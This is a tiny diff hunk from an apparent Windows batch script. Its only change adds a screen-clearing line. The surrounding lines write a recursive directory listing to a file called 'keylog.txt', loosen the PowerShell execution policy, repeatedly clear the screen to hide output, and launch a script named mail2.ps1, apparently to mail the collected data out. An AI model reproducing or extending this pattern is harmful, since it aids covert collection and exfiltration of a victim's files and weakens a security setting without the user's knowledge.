@@ -5,6 +5,7 @@ dir /s > keylog.txt
 @echo off
 cls
 powershell Set-ExecutionPolicy RemoteSigned
+cls
 powershell Get-ExecutionPolicy
 cls
 powershell c:/script\mail2.ps1
